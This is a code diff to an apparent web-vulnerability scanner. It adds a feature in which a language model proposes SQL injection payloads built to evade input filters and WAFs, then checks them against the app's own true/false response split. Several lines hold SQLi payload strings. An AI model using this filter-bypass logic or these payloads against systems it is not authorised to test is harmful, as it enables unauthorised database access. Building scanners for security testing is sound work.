@@ -1,3 +1,4 @@
+import { bus } from "../events/bus.js";
 import type { Severity } from "../events/types.js";
 import type { GraphQLProbe, SoapProbe } from "../recon/index.js";
 import type { Session, SessionRequest, SessionResponse } from "../session/index.js";
@@ -56,7 +57,36 @@ export interface AttemptOpts {
    *  when it also serves the surface, the surface is confirmed shared privileged
    *  functionality rather than the primary principal's own per-user resource. */
   elevated?: Session;
+  /** Model-backed filter-bypass payload synthesis. The deterministic battery
+   *  injects a FIXED payload set; an input filter that neutralizes those (an
+   *  OR/AND blacklist, a space/comment stripper, a WAF) defeats the floor but not
+   *  a payload reasoned from the filter's observed behaviour. When present, a
+   *  failed SQLi check that still sees the parameter reacting to input asks the
+   *  model for bypass candidates — which are then confirmed by the SAME
+   *  benign-anchored differential, so a hallucinated payload that does not
+   *  actually work yields no finding. This is the one place model reasoning can
+   *  confirm a vuln the fixed floor cannot. */
+  payloadSmith?: PayloadSmith;
 }
+
+/** A description of a filtered injection point, handed to the model so it can
+ *  reason about the filter and propose bypasses. Carries no secrets — only the
+ *  field name, the request shape, and short observations of how fixed probes
+ *  were neutralized. */
+export interface FilterBrief {
+  field: string;
+  url: string;
+  method: "GET" | "POST";
+  /** What the fixed probes did and how the app reacted (e.g. "fixed `OR 1=1`
+   *  returned the no-row page; `'\"` raised no DB error"). */
+  observations: string[];
+}
+
+/** Returns candidate boolean-oracle payload PAIRS: each `t` should make the
+ *  underlying query TRUE (return the row) and `f` FALSE (suppress it), crafted
+ *  to survive the described filter. The engine confirms them against the app's
+ *  own true/false fingerprint; it never trusts them on the model's word. */
+export type PayloadSmith = (brief: FilterBrief) => Promise<Array<{ t: string; f: string }>>;
 
 /**
  * Chain technique names the loop seeds deterministically (independent of the
@@ -531,6 +561,15 @@ const SQLI_FALSE = "' AND '1'='2";
 const SQLI_NUM_TRUE = "0/**/OR/**/1=1";
 const SQLI_NUM_FALSE = "0/**/AND/**/1=1";
 
+// A value improbable as any real primary key, used to fetch the app's "no-row"
+// page when fingerprinting a blind true/false oracle. Purely numeric, so it
+// carries no alphabetic token into the fingerprint and no OR/AND for a filter to
+// act on.
+const NO_ROW_VALUE = "999999999";
+// Cap on model-proposed bypass pairs tried per filtered field — bounds cost and
+// keeps the confirmation a tight differential.
+const MAX_BYPASS_PAIRS = 6;
+
 /** Escape a value for an XML text node, so a SOAP envelope stays well-formed. */
 function xmlEscape(value: string): string {
   return value
@@ -861,6 +900,17 @@ async function sqlInjectionCheck(
       }
     }
 
+    // Fixed payloads drew no signal — but the sink may be injectable behind an
+    // input filter that neutralizes the FIXED payload set (an OR/AND blacklist, a
+    // space/comment stripper, a WAF). The deterministic floor cannot adapt; the
+    // model can. If a payload smith is wired, hand it the filter's observed
+    // behaviour and confirm any proposal against the app's own true/false
+    // fingerprint — so a bypass counts only when it actually works.
+    if (opts.payloadSmith) {
+      const adapted = await modelBypassConfirm(session, technique, opts, field);
+      if (adapted) return adapted;
+    }
+
     // No signal on this field: remember the stable status contract and move on.
     last = statusResult(res, base) ?? {
       ok: false,
@@ -871,6 +921,125 @@ async function sqlInjectionCheck(
   }
 
   return last ?? { ok: false, applicable: true, note: `${technique}: no injectable parameter` };
+}
+
+/** Alphabetic tokens (≥3 letters) of a response, HTML stripped — the unit a
+ *  blind true/false fingerprint is built from. Numeric tokens are excluded so a
+ *  reflected id value never contaminates the fingerprint. */
+function contentTokens(body: string): Set<string> {
+  const out = new Set<string>();
+  for (const m of body.replace(/<[^>]+>/g, " ").matchAll(/[A-Za-z]{3,}/g)) {
+    out.add(m[0].toLowerCase());
+  }
+  return out;
+}
+
+/** The value already bound to this field (recon's captured default, or the
+ *  query-string value) — the natural input that returns the row; "1" otherwise. */
+function naturalValue(opts: AttemptOpts, field: string): string {
+  if (opts.formData?.[field]) return opts.formData[field];
+  try {
+    const v = new URL(opts.url).searchParams.get(field);
+    if (v) return v;
+  } catch {
+    /* non-URL target */
+  }
+  return "1";
+}
+
+/** Keep a model-proposed payload only if it is a single short, printable line —
+ *  never trust the model's output into a request unchecked. */
+function sanitizePayload(s: unknown): string {
+  if (typeof s !== "string") return "";
+  const t = s.trim();
+  if (!t || t.length > 120) return "";
+  for (let i = 0; i < t.length; i++) {
+    const c = t.charCodeAt(i);
+    if (c === 0x00 || c === 0x0a || c === 0x0d) return "";
+  }
+  return t;
+}
+
+/**
+ * The one place model reasoning confirms a vuln the fixed floor cannot. When the
+ * deterministic SQLi probes draw no signal, an input filter may be neutralizing
+ * the FIXED payloads rather than the sink being safe. This:
+ *   1. fingerprints the app's OWN true/false response (the row-bearing natural
+ *      value vs a guaranteed-no-row value); bails if there is no observable
+ *      oracle, so a dead parameter never escalates;
+ *   2. asks the model for boolean-oracle bypass pairs tailored to the filter;
+ *   3. confirms a pair ONLY when its true-payload reproduces the row fingerprint
+ *      and its false-payload suppresses it — the app's demonstrated differential,
+ *      never the model's word. A hallucinated payload that does not work yields
+ *      nothing, so this cannot introduce a false positive. SELECT-side, read-only.
+ */
+async function modelBypassConfirm(
+  session: Session,
+  technique: string,
+  opts: AttemptOpts,
+  field: string | undefined,
+): Promise<AttemptResult | undefined> {
+  const smith = opts.payloadSmith;
+  if (!smith || !field) return undefined;
+
+  const refSent = await rawSend(
+    session,
+    injectionRequest(opts, field, naturalValue(opts, field)).req,
+  );
+  const falseSent = await rawSend(session, injectionRequest(opts, field, NO_ROW_VALUE).req);
+  if (refSent.kind !== "ok" || falseSent.kind !== "ok") return undefined;
+  const noRowTokens = contentTokens(falseSent.res.body);
+  const fingerprint = [...contentTokens(refSent.res.body)].filter((t) => !noRowTokens.has(t));
+  if (fingerprint.length === 0) return undefined; // no observable oracle → never escalate
+
+  const brief: FilterBrief = {
+    field,
+    url: opts.url,
+    method: opts.method ?? "GET",
+    observations: [
+      "A fixed boolean probe (' OR '1'='1 / 0 OR 1=1) returned the no-row page — an input filter likely strips or rewrites the payload.",
+      "A quote probe ('\") raised no database error, so errors are suppressed (blind) and only a true/false response differential is observable.",
+    ],
+  };
+  let pairs: Array<{ t: string; f: string }>;
+  try {
+    pairs = (await smith(brief)).slice(0, MAX_BYPASS_PAIRS);
+  } catch {
+    return undefined;
+  }
+  if (pairs.length === 0) return undefined;
+
+  for (const pair of pairs) {
+    const t = sanitizePayload(pair.t);
+    const f = sanitizePayload(pair.f);
+    if (!t || !f || t === f) continue;
+    const tReq = injectionRequest(opts, field, t);
+    const tSent = await rawSend(session, tReq.req, tReq.label);
+    const fSent = await rawSend(session, injectionRequest(opts, field, f).req);
+    if (tSent.kind !== "ok" || fSent.kind !== "ok") continue;
+    const tTokens = contentTokens(tSent.res.body);
+    const fTokens = contentTokens(fSent.res.body);
+    const trueReproducesRow = fingerprint.every((tok) => tTokens.has(tok));
+    const falseSuppressesRow = !fingerprint.some((tok) => fTokens.has(tok));
+    if (trueReproducesRow && falseSuppressesRow) {
+      bus.emit("exploit.adapt", { field, candidates: pairs.length, confirmed: true });
+      return {
+        ok: true,
+        note: `${technique}: fixed probes were filtered; a model-synthesized bypass ('${t}' vs '${f}') reproduced the app's true/false response split on '${field}' — boolean-based SQLi behind an input filter`,
+        applicable: true,
+        basis:
+          "Impact-confirmed: the deterministic fixed-payload probes were neutralized by an input filter, so the model reasoned about the filter and proposed a bypass; two requests differing only in the injected boolean then reproduced the application's OWN row-present vs row-absent fingerprint. Confirmation is the app's demonstrated differential, not the model's claim. SELECT-side only — it reads rows, it writes nothing.",
+        evidence: {
+          request: tReq.label,
+          response: tSent.snippet,
+          note: `model bypass true='${t}' reproduced the row fingerprint; false='${f}' suppressed it`,
+        },
+        status: tSent.res.status,
+      };
+    }
+  }
+  bus.emit("exploit.adapt", { field, candidates: pairs.length, confirmed: false });
+  return undefined;
 }
 
 // A benign reflection marker. The angle brackets are the signal: if they come
